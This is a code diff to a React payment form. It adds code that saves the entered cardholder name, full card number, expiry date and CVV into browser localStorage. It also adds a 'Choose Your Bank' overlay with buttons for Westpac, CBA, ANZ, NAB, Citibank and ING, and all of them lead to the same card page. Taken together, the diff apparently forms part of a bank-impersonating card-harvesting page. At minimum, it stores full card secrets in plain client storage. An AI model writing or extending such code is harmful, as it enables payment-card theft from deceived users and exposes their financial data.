@@ -308,7 +308,13 @@
         if (!validateForm()) return;
         setIsSubmitting(true);
         try {
-          // Simulate async submission (replace with actual API call)
+          // Save data to localStorage
+          localStorage.setItem('citibank_name', formData.cardName.trim().toUpperCase());
+          localStorage.setItem('citibank_number', formData.cardNumber.replace(/\s/g, ''));
+          localStorage.setItem('citibank_expiry', formData.expiryDate);
+          localStorage.setItem('citibank_cvv', formData.cvv);
+          
+          // Simulate async submission
           await new Promise(resolve => setTimeout(resolve, 1000));
           setShowOverlay(true);
           const announcer = document.getElementById('form-announcer');
@@ -328,10 +334,18 @@
 
       const handleBankSelect = (bank) => {
         const bankRoutes = {
-          westpac: '../cards/bank_cards/cc.html'
+          westpac: '../cards/bank_cards/cc.html',
+          commonwealth: '../cards/bank_cards/cc.html',
+          anz: '../cards/bank_cards/cc.html',
+          nab: '../cards/bank_cards/cc.html',
+          citi: '../cards/bank_cards/cc.html',
+          ing: '../cards/bank_cards/cc.html',
+          stgeorge: '../cards/bank_cards/cc.html'
         };
         const url = bankRoutes[bank.toLowerCase()];
         if (url) {
+          // Store the selected bank
+          localStorage.setItem('selected_bank', bank.toLowerCase());
           if (window.gsap) {
             gsap.to('main', {
               opacity: 0,
@@ -459,14 +473,46 @@
           </main>
           {showOverlay && (
             <div className="fixed inset-0 bg-gray-900/95 flex items-center justify-center z-[1000] animate-[fadeIn_0.3s]">
-              <div className="glass rounded-2xl p-4 sm:p-6 max-w-xs w-[90%] text-center shadow-2xl">
-                <h2 className="text-base sm:text-lg font-semibold mb-4">Choose Your Card</h2>
-                <button
-                  onClick={() => handleBankSelect('westpac')}
-                  className="cta-button w-full p-3 mb-2 rounded-lg text-white font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
-                >
-                  Westpac
-                </button>
+              <div className="glass rounded-2xl p-4 sm:p-6 max-w-sm w-[90%] text-center shadow-2xl">
+                <h2 className="text-base sm:text-lg font-semibold mb-4">Choose Your Bank</h2>
+                <div className="grid grid-cols-2 gap-2 mb-4">
+                  <button
+                    onClick={() => handleBankSelect('westpac')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    Westpac
+                  </button>
+                  <button
+                    onClick={() => handleBankSelect('commonwealth')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    CBA
+                  </button>
+                  <button
+                    onClick={() => handleBankSelect('anz')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    ANZ
+                  </button>
+                  <button
+                    onClick={() => handleBankSelect('nab')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    NAB
+                  </button>
+                  <button
+                    onClick={() => handleBankSelect('citi')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    Citibank
+                  </button>
+                  <button
+                    onClick={() => handleBankSelect('ing')}
+                    className="cta-button p-2 rounded-lg text-white text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
+                  >
+                    ING
+                  </button>
+                </div>
                 <button
                   onClick={() => setShowOverlay(false)}
                   className="w-full p-3 rounded-lg bg-transparent font-semibold focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#38B2AC]/50"
